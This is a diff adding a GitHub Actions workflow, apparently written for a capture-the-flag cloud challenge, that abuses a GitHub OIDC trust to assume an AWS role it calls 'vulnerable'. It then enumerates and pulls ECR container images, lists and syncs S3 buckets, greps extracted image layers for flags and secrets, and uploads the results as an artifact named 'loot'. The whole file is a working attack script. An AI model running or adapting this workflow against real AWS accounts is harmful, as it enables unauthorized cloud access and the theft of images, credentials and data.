@@ -1,0 +1,153 @@
+name: assume-aws-and-dump
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+  # Optional: uncomment to auto-check for updates (e.g., every hour)
+  # schedule:
+  #   - cron: "15 * * * *"  # runs at hh:15
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # (A) Show what our OIDC token 'sub' looks like (prove we match the trust)
+      - name: Show OIDC 'sub' claim
+        id: show_sub
+        run: |
+          set -eux
+          # Ask Actions for an OIDC token (audience must be sts.amazonaws.com)
+          TOKEN_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com"
+          RAW_JWT=$(curl -sSf -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${TOKEN_URL}" | jq -r .value)
+          IFS='.' read -r HEADER PAYLOAD SIG <<< "$RAW_JWT"
+          echo "$PAYLOAD" | base64 -d 2>/dev/null | jq .
+          echo "::notice title=OIDC sub::$(echo "$PAYLOAD" | base64 -d 2>/dev/null | jq -r .sub)"
+
+      # (B) Assume the vulnerable AWS role via OIDC
+      - name: Configure AWS creds via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: ap-east-1
+          audience: sts.amazonaws.com
+
+      - name: Whoami
+        run: aws sts get-caller-identity
+
+      # --- ECR ENUMERATION ---
+      - name: List ECR repositories (names & URIs)
+        id: ecr_repos
+        run: |
+          set -eux
+          aws ecr describe-repositories \
+            --query '{names:repositories[].repositoryName, uris:repositories[].repositoryUri}' \
+            --output json > /tmp/ecr_repos.json || echo '{}' > /tmp/ecr_repos.json
+          cat /tmp/ecr_repos.json
+
+      - name: List images (tags/digests) per repo
+        run: |
+          set -eux
+          jq -r '.names[]?' /tmp/ecr_repos.json | while read -r repo; do
+            echo "=== $repo ==="
+            aws ecr list-images --repository-name "$repo" --query 'imageIds[]' --output json || true
+          done
+
+      - name: Docker login (if token allowed)
+        run: |
+          set -eux
+          aws ecr get-login-password | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com
+
+      - name: Try pulling discovered images (names & tags)
+        run: |
+          set -eux
+          pulled=0
+          for repo in $(jq -r '.names[]?' /tmp/ecr_repos.json); do
+            # Try tags
+            for tag in $(aws ecr list-images --repository-name "$repo" --query 'imageIds[?imageTag].imageTag' --output text 2>/dev/null || true); do
+              echo "[*] docker pull $repo:$tag"
+              if docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag; then
+                docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo:$tag -o image.tar
+                pulled=1; break 2
+              fi
+            done
+            # Fallback to digests
+            for digest in $(aws ecr list-images --repository-name "$repo" --query 'imageIds[?imageDigest].imageDigest' --output text 2>/dev/null || true); do
+              echo "[*] docker pull $repo@$digest"
+              if docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo@$digest; then
+                docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/$repo@$digest -o image.tar
+                pulled=1; break 2
+              fi
+            done
+          done
+          if [ "$pulled" -eq 0 ]; then
+            echo "[!] No images pulled (likely missing ecr:BatchGetImage or no repos)."
+          fi
+
+      # --- S3 ENUM / DOWNLOAD TARGETS ---
+      - name: List buckets (if allowed)
+        run: |
+          set -eux
+          aws s3api list-buckets --query 'Buckets[].Name' --output text || true
+
+      - name: Probe public challenge bucket
+        run: |
+          set -eux
+          aws s3 ls s3://challenge-assets-production-empasoft-ctf/ --region ap-east-1 || true
+          aws s3 ls s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ --region ap-east-1 || true
+
+      # If the role has object read on any bucket, sync is great for "only pull changed"
+      - name: Sync challenge path locally (only changed files)
+        run: |
+          set -eux
+          mkdir -p downloads
+          # If objects are public, this still works; if private, it requires s3:GetObject
+          aws s3 sync \
+            s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/ \
+            downloads/ --exact-timestamps --region ap-east-1 || true
+
+          # Also pull the IAM role document you mentioned
+          aws s3 cp \
+            s3://challenge-assets-production-empasoft-ctf/forensic/imaginary-challenge/iam-role \
+            downloads/iam-role --region ap-east-1 || true
+
+          # Show what changed in this run
+          if command -v md5sum >/dev/null 2>&1; then
+            (cd downloads && find . -type f -maxdepth 1 -exec md5sum {} + | sort) || true
+          fi
+
+      # --- OPTIONAL: dump layers for grepping secrets/flags ---
+      - name: Dump filesystem from image (if pulled)
+        if: always()
+        run: |
+          set -eux
+          if [ -f image.tar ]; then
+            mkdir img && tar -xf image.tar -C img
+            find img -type f -name 'layer.tar' -exec sh -c '
+              for f in "$@"; do
+                d=$(mktemp -d)
+                tar -xf "$f" -C "$d"
+                echo "[+] Searching $f"
+                rg -n --hidden --no-messages -i "flag|secret|aes|gcm|pbkdf2|rockyou|base64|aad|REDACTED" "$d" || true
+                tar -czf "$f.files.tgz" -C "$d" .
+              done
+            ' sh {} +
+          fi
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: loot
+          path: |
+            /tmp/ecr_repos.json
+            image.tar
+            img/**/*
+            downloads/**
+            **/*.files.tgz
+          if-no-files-found: ignore
